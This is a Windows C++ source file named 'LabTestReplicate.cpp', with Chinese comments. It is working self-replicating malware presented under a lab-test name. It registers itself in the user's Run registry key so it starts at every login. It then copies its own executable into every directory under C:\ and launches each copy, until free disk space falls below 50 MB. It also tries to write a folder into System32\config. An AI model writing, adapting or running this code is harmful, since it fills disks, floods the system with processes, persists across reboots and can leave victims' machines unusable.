// LabTestReplicate.cpp
#include <windows.h>
#include <filesystem>
#include <queue>
#include <string>
#include <fstream>

namespace fs = std::filesystem;

const std::wstring kRoot      = L"C:\\";
const ULONGLONG    kMinFreeMB = 50;

/* ---------- 磁盘剩余空间 ---------- */
ULONGLONG FreeMB() {
    ULARGE_INTEGER free{};
    GetDiskFreeSpaceExW(kRoot.c_str(), &free, nullptr, nullptr);
    return free.QuadPart / (1024 * 1024);
}

/* ---------- 写日志 ---------- */
void Log(const std::wstring& msg) {
    try {
        std::wofstream ofs(L"C:\\Temp\\LabReplicate.log", std::ios::app);
        ofs << msg << L"\n";
    } catch (...) {}
}

/* ---------- 创建 OSDATA ---------- */
bool CreateOsDataDir() {
    const wchar_t* path = L"C:\\Windows\\System32\\config\\OSDATA";

    if (CreateDirectoryW(path, nullptr))
        return true;                    // 成功
    DWORD err = GetLastError();
    if (err == ERROR_ALREADY_EXISTS)
        return true;                    // 已存在也算成功

    Log(L"CreateDirectoryW failed, error=" + std::to_wstring(err));
    return false;
}

/* ---------- 开机自启 ---------- */
void AddToStartup() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        fs::path self = fs::canonical(__argv[0]);
        RegSetValueExW(hKey, L"LabTestReplicate", 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(self.c_str()),
                       (self.native().size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

/* ---------- 复制并立即启动 ---------- */
void Replicate(const fs::path& self, const fs::path& dir) {
    if (FreeMB() < kMinFreeMB) return;

    static ULONGLONG id = 0;
    auto dst = dir / (L"rep_" + std::to_wstring(++id) + L".exe");

    try {
        fs::copy_file(self, dst, fs::copy_options::overwrite_existing);
    } catch (...) { return; }

    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    CreateProcessW(nullptr,
                   const_cast<LPWSTR>(dst.c_str()),
                   nullptr, nullptr, FALSE, 0,
                   nullptr, dir.c_str(), &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

/* ---------- BFS 遍历复制 ---------- */
void BfsReplicate(const fs::path& self) {
    /* ===== 新增：先创建 OSDATA ===== */
    if (!CreateOsDataDir()) {
        Log(L"Failed to create OSDATA directory – insufficient privileges.");
    }

    if (!fs::exists(kRoot)) fs::create_directories(kRoot);

    std::queue<fs::path> q;
    q.push(kRoot);

    // 1. 处理所有子目录
    while (!q.empty()) {
        auto current = q.front(); q.pop();
        try {
            for (const auto& entry : fs::directory_iterator(current)) {
                if (entry.is_directory()) {
                    q.push(entry.path());
                    Replicate(self, entry.path());
                    if (FreeMB() < kMinFreeMB) return;
                }
            }
        } catch (...) {}
    }

    // 2. 最后处理当前目录本身
    Replicate(self, kRoot);
}

/* ---------- 主入口 ---------- */
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    AddToStartup();
    BfsReplicate(fs::canonical(__argv[0]));
    return 0;
}